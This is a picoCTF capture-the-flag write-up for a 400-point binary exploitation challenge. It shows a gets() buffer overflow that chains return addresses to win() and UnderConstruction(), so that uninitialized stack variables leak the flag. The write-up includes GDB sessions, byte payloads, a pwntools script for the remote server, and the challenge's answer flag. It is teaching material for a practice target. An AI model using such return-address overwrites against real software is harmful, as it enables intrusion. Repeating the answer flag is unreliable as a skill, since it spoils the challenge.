# Stack Cache - 400 pts

### Key points

- Buffer Overflow
- Undefined Behaviour

---

## **Contents**

- [Overview](#overview)
- [Solution](#solution)
- [Flag](#the-flag)

---

## Overview

### Description

> Undefined behaviours are fun. It looks like Dr. Oswal allowed buffer overflows again. Analyse this program to identify how you can get to the flag.

We are given a binary and its source code.

---

### Solution

Open the source code. We have a `main()` function that calls a function `vuln()`. `vuln()` takes an input via `gets()`, which means we are free to stack smash. It also prints our input back to us. There are two other functions, `win()` and `UnderConstruction()()`, that are never called. That's not a problem though, since we can simply overwrite return addresses to the addresses of these functions.

`win()` reads a file `flag.txt`, but never actually prints it.

`UnderConstruction()()` is where the undefined behaviour the challenge hints at occurs. Some variables are defined but never initialized, and then printed. Undefined behaviour is when the result of executing a program is unpredictable. Let's see what happens if we call `UnderConstruction()()`.

---

Decompile the binary in Ghidra to find the addresses we need.

The address of `UnderConstruction()()` is `0x08049e20`.

The address of `win()` is `0x08049da0`.

Let's run the binary in GDB to find the offset. The input size buffer is set to 10, so we shouldn't have to enter a super-long string. Set a breakpoint at the return address of `vuln()`.

```
$ gdb vuln
gef> b *0x08049ef8
Breakpoint 1 at 0x8049ef8
gef> r
Starting program: /var/www/CanHack/vuln
Give me a string that gets you the flag
aaaabbbbccccddddeeeeffffgggg
aaaabbbbccccddddeeeeffffgggg

Breakpoint 1, 0x08049ef8 in vuln ()
...
gef> continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x65656464 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1d
$ebx   : 0x80e7000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$ecx   : 0x1d
$edx   : 0xffffffff
$esp   : 0xffffd470  →  "eeffffgggg"
$ebp   : 0x64646363 ("ccdd"?)
$esi   : 0x80e7000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$edi   : 0x80e7000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$eip   : 0x65656464 ("ddee"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
```

The return pointer, `$eip`, has been overwritten to `0x65656464`, which is `ddee`. So our null bytes will be the length of `aaaabbbbccccdd`, which is 14.

Let's set a breakpoint at the return address of `UnderConstruction()`, and run the program with an overwrite of `vuln()`'s return address to the address of `UnderConstruction()` (`0x08049e20`), packed as bytes.

```
gef>  b *0x08049eb3
Breakpoint 1 at 0x8049eb3
gef>  r < <(echo -ne "aaaaaaaaaaaaaa\x20\x9e\x04\x08")
Starting program: /var/www/CanHack/vuln < <(echo -ne "aaaaaaaaaaaaaa\x20\x9e\x04\x08")
Give me a string that gets you the flag
aaaaaaaaaaaaaa ▒
User information : 0x8049ef4 0x8051349 0x80e7000 0x80e7000 (nil) 0xffffd454
Names of user: 0x80c9a04 0x80e71c0 0x8051369
Age of user: 0xffffd468

Breakpoint 1, 0x08049eb3 in UnderConstruction ()
```

In C, if a variable is unitialized, it is not given a default value of 0 (unlike some other languages). Instead, it is assigned whatever value happens to be in the memory location the variable is being assigned to. We can use this exploit:

First we jump to `win()`, which _reads_ the flag into the memory, then we jump to `UnderConstruction()`, which _prints_ the memory that should have the flag in it.

`win()` doesn't have a buffer, we shouldn't need any null bytes there. Our payload will look like this:

`14 null bytes + address of win() + address of UnderConstruction()`

Lastly, don't forget to create a fake flag in `flag.txt` so `win()` doesn't complain.

```
$ echo "picoCTF{t35t_fl4g}" > flag.txt
$ gdb vuln
gef>  run < <(echo -ne "aaaaaaaaaaaaaa\xa0\x9d\x04\x08\x20\x9e\x04\x08")
Starting program: /var/www/CanHack/vuln < <(echo -ne "aaaaaaaaaaaaaa\xa0\x9d\x04\x08\x20\x9e\x04\x08")
Give me a string that gets you the flag
aaaaaaaaaaaaaa▒ ▒
User information : 0x80c9a04 0x8049ef4 0x8051349 0x80e7000 0x80e7000 0xa7d67
Names of user: 0x346c665f 0x74353374 0x7b465443
Age of user: 0x6f636970
```

If you are familiar with solving picoCTF challenges, that `0x6f636970` should raise some red flags - it's the hex representation of `pico`! (backwards for endianness). Converting the hex from there back until `7d` (`'}'`), we get our fake flag, `picoCTF{t35t_fl4g}`. Time to pwn!

---

Connect to the remote and send our payload:

```
from pwn import *

r = remote("saturn.picoctf.net", 55387)

payload = b"a" * 14 + p32(0x08049da0) + p32(0x08049e20)
r.sendline(payload)
result = r.recvall()
r.close()
```

Get the hex values:

```
result = result[result.index("0x"):]

hex_result = ""
for i in result.split():
    i = i[2:]
    try:
        int(i, 16)
    except:
        continue
    else:
        if len(i) >= 2:
            hex_result += i
```

Decode the flag and reverse it (endianness):

```
FLAG = hex_result[hex_result.index("7d"):hex_result.index("6f636970") + 8]
FLAG = bytearray.fromhex(FLAG).decode()
FLAG = FLAG[::-1]

print("Flag:", FLAG)
```

The full script is in [solve.py](solve.py).

---

## Flag

> `picoCTF{Cle4N_uP_M3m0rY_4c1cd4ab}`
